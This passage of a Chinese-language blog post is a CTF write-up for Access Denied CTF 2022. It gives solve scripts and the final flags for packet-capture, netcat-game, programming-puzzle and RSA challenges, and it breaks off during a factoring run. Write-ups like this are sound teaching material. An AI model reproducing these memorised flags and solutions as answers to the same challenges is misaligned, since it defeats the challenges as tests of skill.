

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/banner/piano_man.png">
  <link rel="icon" href="/banner/piano_man.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="lanpesk">
  <meta name="keywords" content="">
  
    <meta name="description" content="Access Denied CTF 2022">
<meta property="og:type" content="article">
<meta property="og:title" content="Access Denied CTF 2022">
<meta property="og:url" content="http://example.com/2022/06/12/Access-Denied-CTF-2022/index.html">
<meta property="og:site_name" content="lanpesk">
<meta property="og:description" content="Access Denied CTF 2022">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-06-12T11:24:01.000Z">
<meta property="article:modified_time" content="2022-09-28T01:22:04.578Z">
<meta property="article:author" content="lanpesk">
<meta property="article:tag" content="Crypto">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="writeup">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="MISC">
<meta property="article:tag" content="Reverse">
<meta name="twitter:card" content="summary_large_image">
  
  
  <title>Access Denied CTF 2022 - lanpesk</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.2"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>lanpesk</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('https://s2.loli.net/2022/05/01/YwbfzI9vkWMaVc2.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="Access Denied CTF 2022">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-06-12 19:24" pubdate>
        2022年6月12日 晚上
      </time>
    </span>
  
</div>

<div class="mt-1">
  

  

  
  
    
      <!-- 不蒜子统计文章PV -->
      <span id="busuanzi_container_page_pv" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="busuanzi_value_page_pv"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Access Denied CTF 2022</h1>
            
            <div class="markdown-body">
              <p>Access Denied CTF 2022</p>
<span id="more"></span>
<p>难度不算太大。这次和我朋友努力一把冲前20希望能成功。第一次能把MISC ak。</p>
<h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> MISC</h1>
<p>没有隐写的misc，写着真舒服。</p>
<h2 id="shark-1"><a class="markdownIt-Anchor" href="#shark-1"></a> <strong>Shark-1</strong></h2>
<p>Description：</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs applescript">Nobody likes traffic, <span class="hljs-keyword">but</span> what <span class="hljs-keyword">about</span> network traffic?<br></code></pre></td></tr></table></figure>
<p>附件是pcapng。</p>
<p>在tcp流0中有信息。</p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">give <span class="hljs-keyword">me</span> the <span class="hljs-built_in">xor</span> <span class="hljs-keyword">key</span><br><span class="hljs-built_in">xor</span> <span class="hljs-keyword">key</span> <span class="hljs-number">80</span><br>Here <span class="hljs-built_in">is</span> the flag: <span class="hljs-number">4</span>ePj5fPz5OXu6eXk+/ex8rPz6LTy69/<span class="hljs-built_in">is</span>/P03+aw8t/wtOPrs/Tf8+<span class="hljs-number">6</span>x5uax7uffuebjs7i0seKx/Q==<br>Thank you got it<br></code></pre></td></tr></table></figure>
<p>base64解码然后异或一下就行了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><br>data = b64decode(<span class="hljs-string">&quot;4ePj5fPz5OXu6eXk+/ex8rPz6LTy69/is/P03+aw8t/wtOPrs/Tf8+6x5uax7uffuebjs7i0seKx/Q==&quot;</span>)<br>key = <span class="hljs-number">0x80</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i^key), end=<span class="hljs-string">&quot;&quot;</span>)<br>    <br><span class="hljs-comment"># accessdenied&#123;w1r3sh4rk_b3st_f0r_p4ck3t_sn1ff1ng_9fc3841b1&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="flow"><a class="markdownIt-Anchor" href="#flow"></a> <strong>Flow</strong></h2>
<p>Description：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Kill</span> the dragon.<br><span class="hljs-attribute">server</span>: nc <span class="hljs-number">35.193.60.121</span> <span class="hljs-number">9337</span><br></code></pre></td></tr></table></figure>
<p>这题挺奇怪的，随便试试就出来了。一开始以为要整数溢出，结果不需要。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">C:\Users\lanpesk&gt;nc 35.193.60.121 9337<br>1.) Fight the dragon<br>2.) Enter the shop<br>3.) See your current level<br>4.) exit<br>2<br>There are 5 levels of sword available<br>1.) Level 1 sword each costs 500. It helps you level up by 1<br>2.) Level 2 sword each costs 5000. It helps you level up by 10<br>3.) Level 3 sword each costs 50000. It helps you level up by 100<br>4.) Level 4 sword each costs 500000. It helps you level up by 1000<br>5.) Level 5 sword each costs 5000000. It helps you level up by 10000<br>Which sword you want? 5<br>Enter the number of swords you want to buy? 12321<br>You have success increased your level to 123210001<br>1.) Fight the dragon<br>2.) Enter the shop<br>3.) See your current level<br>4.) exit<br>1<br>The dragon is currently on level 5000000.<br>Hoooo........ You killed the dragon<br>Here is your flag accessdenied&#123;1nt3g3r_0v3rfl0w5_4r3_d4ng3r0u5_2d7b9a76&#125;<br></code></pre></td></tr></table></figure>
<h2 id="shark-2"><a class="markdownIt-Anchor" href="#shark-2"></a> <strong>Shark-2</strong></h2>
<p>Description：</p>
<figure class="highlight mercury"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mercury">I guess you know what wireshark <span class="hljs-keyword">is</span>.<br></code></pre></td></tr></table></figure>
<p>在tcp流42中有一张图片。</p>
<p>导出来打开即可的flag。</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># accessdenied&#123;3xtr4ct_0bj3ct5_fr0m_w1r3sh4rk&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="bobs-favourite-number"><a class="markdownIt-Anchor" href="#bobs-favourite-number"></a> <strong>Bobs Favourite Number</strong></h2>
<p>Description：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Can</span> you find identify bob&#x27;s favourite numbers?<br><span class="hljs-attribute">server</span>: nc <span class="hljs-number">35.193.60.121</span> <span class="hljs-number">1337</span><br></code></pre></td></tr></table></figure>
<p>附件是题目的描述。</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Bobs favourite numbers<br><br>Bob likes two numbers <span class="hljs-number">1856</span> (<span class="hljs-keyword">as</span> his college was founded <span class="hljs-keyword">as</span> <span class="hljs-keyword">the</span> Civil Engineering College <span class="hljs-keyword">on</span> <span class="hljs-number">24</span> November <span class="hljs-number">1856</span>) <span class="hljs-keyword">and</span> <span class="hljs-number">2014</span> (<span class="hljs-keyword">as</span> his college was renamed <span class="hljs-keyword">as</span> Indian Institute <span class="hljs-keyword">of</span> Engineering Science <span class="hljs-keyword">and</span> Technology, Shibpur <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> Govt. <span class="hljs-keyword">of</span> India <span class="hljs-keyword">in</span> March <span class="hljs-number">2014</span>).<br><br>A <span class="hljs-built_in">number</span> N <span class="hljs-keyword">is</span> Bob&#x27;s favourite <span class="hljs-built_in">number</span> <span class="hljs-keyword">if</span> N <span class="hljs-keyword">is</span> <span class="hljs-keyword">equal</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> sum <span class="hljs-keyword">of</span> a certain <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1856</span> <span class="hljs-keyword">and</span> sum <span class="hljs-keyword">of</span> a certain <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> <span class="hljs-number">2014.</span><br><br>Task: Print whether a <span class="hljs-built_in">number</span> <span class="hljs-keyword">is</span> Bob&#x27;s favourite <span class="hljs-built_in">number</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span>.<br><br>Input: <br>First line <span class="hljs-keyword">contains</span> a single <span class="hljs-built_in">integer</span> <span class="hljs-built_in">number</span> N.<br><br>Output:<br>Print “Yes” <span class="hljs-keyword">if</span> Favourite <span class="hljs-keyword">if</span> N <span class="hljs-keyword">is</span> Bob’s favourite <span class="hljs-built_in">number</span>, <span class="hljs-keyword">else</span> print “No”.<br><br>Constraints: <span class="hljs-number">1</span> &lt;= N &lt;= <span class="hljs-number">10</span>^<span class="hljs-number">9</span><br><br>Sample input:<br><span class="hljs-number">5726</span><br><br>Sample output:<br>Yes<br><br>Sample explanation:<br><span class="hljs-number">5726</span> can be represented <span class="hljs-keyword">as</span> <span class="hljs-keyword">the</span> sum <span class="hljs-keyword">of</span> <span class="hljs-number">1856</span> + <span class="hljs-number">1856</span> + <span class="hljs-number">2014.</span><br></code></pre></td></tr></table></figure>
<p>判断给出的数是否是由1856和2014组成的。</p>
<p>跑脚本就可以了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = remote ( <span class="hljs-string">&quot;35.193.60.121&quot;</span>, <span class="hljs-number">1337</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    num = <span class="hljs-built_in">eval</span>(r.recvline())<br>    r.recvline()<br><br>    c = num<br>    a = <span class="hljs-number">1856</span><br>    b = <span class="hljs-number">2014</span><br><br>    <span class="hljs-comment"># 懒得写数论，多跑几次就能出， 网上找的二元一次不定方程的解判定不太行。干脆直接暴力了。</span><br>    find = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> num % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(c // a + <span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):  <span class="hljs-comment"># 穷举可能的x</span><br>            <span class="hljs-keyword">if</span> find:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>((c - a * x) // b + <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):  <span class="hljs-comment"># 穷举可能的y</span><br>                <span class="hljs-keyword">if</span> a * x + b * y == c:<br>                    find = <span class="hljs-literal">True</span><br>                    <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> find:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Yes&quot;</span>)<br>        r.send(<span class="hljs-string">b&quot;Yes\n&quot;</span>)<br>        find = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No&quot;</span>)<br>        r.send(<span class="hljs-string">b&quot;No\n&quot;</span>)<br><br>    flag = r.recvline()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;access&quot;</span> <span class="hljs-keyword">in</span> flag:<br>        <span class="hljs-built_in">print</span>(flag)<br>        <span class="hljs-keyword">break</span><br><br>r.closed()<br><br><span class="hljs-comment"># accessdenied&#123;b0bs_f4v0r1t3_numb3r5_4r3_m1n3_f4v0urit3_t00_61c884c8&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="green-and-red-flags"><a class="markdownIt-Anchor" href="#green-and-red-flags"></a> <strong>Green and Red flags</strong></h2>
<p>Description：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Find</span> the greatest number possible.<br><span class="hljs-attribute">server</span>: server: nc <span class="hljs-number">35.193.60.121</span> <span class="hljs-number">5337</span><br></code></pre></td></tr></table></figure>
<p>附件是题目描述。</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Green <span class="hljs-keyword">and</span> Red Flag<br><br>Given <span class="hljs-keyword">a</span> <span class="hljs-built_in">number</span> N <span class="hljs-keyword">and</span> <span class="hljs-keyword">each</span> <span class="hljs-built_in">number</span> is assigned either <span class="hljs-keyword">a</span> green <span class="hljs-keyword">or</span> red flag. We can apply <span class="hljs-keyword">the</span> following operations <span class="hljs-keyword">any</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> times: choose <span class="hljs-keyword">any</span> <span class="hljs-literal">two</span> digits <span class="hljs-keyword">of</span> <span class="hljs-built_in">number</span> N <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> same coloured flag assigned <span class="hljs-keyword">and</span> swap them.<br><br>Task: Print <span class="hljs-keyword">the</span> maximum possible <span class="hljs-built_in">number</span>, <span class="hljs-keyword">after</span> applying <span class="hljs-keyword">any</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> operations <span class="hljs-keyword">on</span> <span class="hljs-title">number</span> <span class="hljs-title">N</span>.<br><br>Input: <br>First <span class="hljs-built_in">line</span> <span class="hljs-keyword">contains</span> D <span class="hljs-keyword">the</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> digits <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">number</span> N.<br>Second <span class="hljs-built_in">line</span> <span class="hljs-keyword">contains</span> <span class="hljs-keyword">a</span> <span class="hljs-keyword">string</span> N which indicates <span class="hljs-keyword">the</span> <span class="hljs-built_in">number</span> N.<br>Third <span class="hljs-built_in">line</span> <span class="hljs-keyword">contains</span> <span class="hljs-keyword">a</span> <span class="hljs-keyword">string</span> C which indicates <span class="hljs-keyword">the</span> colour <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> flag assigned <span class="hljs-built_in">to</span> <span class="hljs-keyword">each</span> digit.<br><br>Output:<br>Print <span class="hljs-keyword">the</span> maximum possible <span class="hljs-built_in">number</span>, <span class="hljs-keyword">after</span> applying <span class="hljs-keyword">any</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> operations <span class="hljs-keyword">on</span> <span class="hljs-title">number</span> <span class="hljs-title">N</span>.<br><br>Constraints: <span class="hljs-number">1</span> &lt;= D &lt;= <span class="hljs-number">10</span>^<span class="hljs-number">6</span><br><br>Sample input<br><span class="hljs-number">5</span><br><span class="hljs-number">16487</span><br>rgrrg<br><br>Sample output<br><span class="hljs-number">87416</span> <br></code></pre></td></tr></table></figure>
<p>就是r的数字可以互相换位置，g的位置可以互相换位置。那么我们只要rg的序列都是最大的就可以了。这题的数据量十分大，所以我找了在国外的同学来帮我跑这个脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = remote(<span class="hljs-string">&quot;35.193.60.121&quot;</span>, <span class="hljs-number">5337</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    flag = r.recvline()<br>    num = r.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>).replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>    word = r.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>    r.recvline()     <span class="hljs-comment"># Answer</span><br><br>    <span class="hljs-built_in">print</span>(num)<br>    <span class="hljs-built_in">print</span>(word)<br><br>    green = []<br>    red = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(word)):<br>        <span class="hljs-keyword">if</span> word[i] == <span class="hljs-string">&quot;g&quot;</span>:<br>            green.append(<span class="hljs-built_in">eval</span>(num[i]))<br>        <span class="hljs-keyword">else</span>:<br>            red.append(<span class="hljs-built_in">eval</span>(num[i]))<br><br>    green = <span class="hljs-built_in">sorted</span>(green)<br>    red = <span class="hljs-built_in">sorted</span>(red)<br><br>    result = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> word:<br>        <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;g&quot;</span>:<br>            result.append(<span class="hljs-built_in">str</span>(green.pop()))<br>        <span class="hljs-keyword">else</span> :<br>            result.append(<span class="hljs-built_in">str</span>(red.pop()))<br><br>    r.sendline(<span class="hljs-string">&quot;&quot;</span>.join(result).encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    <span class="hljs-built_in">print</span>(r.recvline())<br><br><span class="hljs-comment"># accessdenied&#123;gr33n_fl4gs_f0r_m3_4nd_r3d_fl4g5_4re_f0r_y0u_c8e0c8a3&#125;</span><br></code></pre></td></tr></table></figure>
<h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1>
<p>有些题有想法但是解不出来</p>
<h2 id="rsa-1"><a class="markdownIt-Anchor" href="#rsa-1"></a> <strong>RSA-1</strong></h2>
<p>Description：</p>
<figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-keyword">let</span>&#x27;s <span class="hljs-built_in">get</span> down <span class="hljs-keyword">to</span> basics.<br></code></pre></td></tr></table></figure>
<p>附件内容如下：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">p</span> = <span class="hljs-number">10428615258416108003372202871855627713663325599674460924186517713082197448534315449595394752587304354394402047262801959990727856908043138185588365886987557</span><br><span class="hljs-attr">q</span> = <span class="hljs-number">8849030739304056868757301096931487921973840186794195322071503751716059434197468028088264340322992996182734000877348221433845302801843370163430108727308579</span><br><span class="hljs-attr">e</span> = <span class="hljs-number">65537</span><br><span class="hljs-attr">cipher_text</span> = <span class="hljs-number">84826403344972753121997388456739256614537789930909176473018827332005543366933391914385410712984001888365906754988120732970328825657318675360778107518188000885732104031648548997976916964730682864696944786364581243443475767387970255510475855029059715864139791778210784283726274424510221073880200865856769716576</span><br></code></pre></td></tr></table></figure>
<p>直接接就可以。</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-attr"># accessdenied&#123;RSA_1</span>S_<span class="hljs-number">4</span><span class="hljs-name">M4</span>Z<span class="hljs-number">1</span><span class="hljs-symbol">nG_R1</span>GhT????_<span class="hljs-number">2</span>a<span class="hljs-number">5286</span>af&#125;<br></code></pre></td></tr></table></figure>
<h2 id="rsa-2"><a class="markdownIt-Anchor" href="#rsa-2"></a> <strong>RSA-2</strong></h2>
<p>Description：</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">Ok, What are you gonna <span class="hljs-keyword">do</span> <span class="hljs-built_in">now</span>?<br></code></pre></td></tr></table></figure>
<p>附件内容：</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">N</span> <span class="hljs-operator">=</span> <span class="hljs-number">264057768287532610924734156161085846111271356228103155462076871372364307056741048144764594645062879781647063846971890031256799636109911752078600428566502298518944558664381187</span><br><span class="hljs-attribute">e</span> <span class="hljs-operator">=</span> <span class="hljs-number">65537</span><br><span class="hljs-attribute">ct</span> <span class="hljs-operator">=</span> <span class="hljs-number">175347248748800717331910762241898102719683222504200516534883687111045877096093372005991552193144558951747833811929393668749668731738201985792026669764642235225240342271148171</span><br></code></pre></td></tr></table></figure>
<p>又是什么都没有，yafu分解。</p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">F:</span>\CTFTools\yafu-<span class="hljs-number">1.34</span>&gt;yafu-x64.exe<br>factor(<span class="hljs-number">264057768287532610924734156161085846111271356228103155462076871372364307056741048144764594645062879781647063846971890031256799636109911752078600428566502298518944558664381187</span>)<br><br><br><span class="hljs-symbol">fac:</span> factoring <span class="hljs-number">264057768287532610924734156161085846111271356228103155462076871372364307056741048144764594645062879781647063846971890031256799636109911752078600428566502298518944558664381187</span><br><span class="hljs-symbol">fac:</span> <span class="hljs-keyword">using</span> pretesting plan: normal<br><span 